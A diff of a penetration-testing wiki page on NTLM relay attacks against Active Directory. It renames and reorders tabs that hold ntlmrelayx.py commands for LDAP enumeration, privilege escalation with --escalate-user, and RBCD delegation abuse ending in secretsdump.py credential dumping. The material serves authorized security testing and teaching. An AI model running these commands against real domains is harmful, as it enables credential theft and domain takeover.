@@ -57,7 +57,7 @@ As of november 2020, MIC was optional, but unofficial channels suggest it might'
 Windows Server 2019 ISOs seem to be patched against \(at least\) CVE-2019-1040.
 {% endhint %}
 
-### EPA \(a.k.a. Channel binding\) <a id="EPA-Extended-Protection-for-Authentication"></a>
+### EPA \(Extended Protection for Auth.\) <a id="EPA-Extended-Protection-for-Authentication"></a>
 
 In short, EPA \(Extended Protection for Authentication\) can use one or both of the following two mitigations to provide mitigation against NTLM relay for protocols that don't support session signing such HTTPS and LDAPS:
 
@@ -108,7 +108,7 @@ proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
 ```
 {% endtab %}
 
-{% tab title="Domain enum" %}
+{% tab title="Enum" %}
 The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files.
 
 ```bash
@@ -116,7 +116,7 @@ ntlmrelayx.py -t ldap://$DC_TARGET
 ```
 {% endtab %}
 
-{% tab title="Account creation" %}
+{% tab title="Creation" %}
 The following command will abuse the default value \(i.e. 10\) of `ms-DS-MachineAccountQuota` to create a domain machine account. The tester will then be able to use it for AD operations.
 
 ```bash
@@ -134,7 +134,19 @@ In most cases, the `--remove-mic` option will be needed when relaying to LDAP\(S
 {% endhint %}
 {% endtab %}
 
-{% tab title="Kerberos deleg." %}
+{% tab title="Promotion" %}
+The following command will try to relay the authentication over LDAPS and escalate the privileges of a domain user by adding it to a privileged group \(`--escalate-user`\) if the relayed account has sufficient privileges.
+
+```bash
+ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
+```
+
+{% hint style="info" %}
+This technique is usually combined with a [PushSubscription abuse \(a.k.a. PrivExchange\)](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains \(`WriteDACL` over domain object, see [Abusing ACEs](../access-control-entries/)\) to escalate a domain user privileges \(`--escalate-user`\).
+{% endhint %}
+{% endtab %}
+
+{% tab title="Delegation" %}
 The following command will [abuse Resource Based Kerberos Constrained Delegations \(RBCD\)](../kerberos/delegations.md#resource-based-constrained-delegations-rbcd) to gain admin access to the relayed machine. The `--escalate-user` option must be supplied with a controlled machine account name. If no machine account is controlled, the `--add-computer` option can be supplied instead like the "Account creation" tab before, and by targeting LDAPS instead of LDAP.
 
 ```bash
@@ -148,18 +160,6 @@ getST.py -spn host/$RELAYED_VICTIM '$DOMAIN/$NEW_MACHINE_ACCOUNT$:$PASSWORD' -dc
 export KRB5CCNAME=$USER_TO_IMPERSONATE.ccache
 secretsdump.py -k $RELAYED_VICTIM
 ```
-{% endtab %}
-
-{% tab title="Privesc" %}
-The following command will try to relay the authentication over LDAPS and escalate the privileges of a domain user by adding it to a privileged group \(`--escalate-user`\) if the relayed account has sufficient privileges.
-
-```bash
-ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
-```
-
-{% hint style="info" %}
-This technique is usually combined with a [PushSubscription abuse \(a.k.a. PrivExchange\)](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains \(`WriteDACL` over domain object, see [Abusing ACEs](../access-control-entries/)\) to escalate a domain user privileges \(`--escalate-user`\).
-{% endhint %}
 {% endtab %}
 
 {% tab title="DCSync" %}
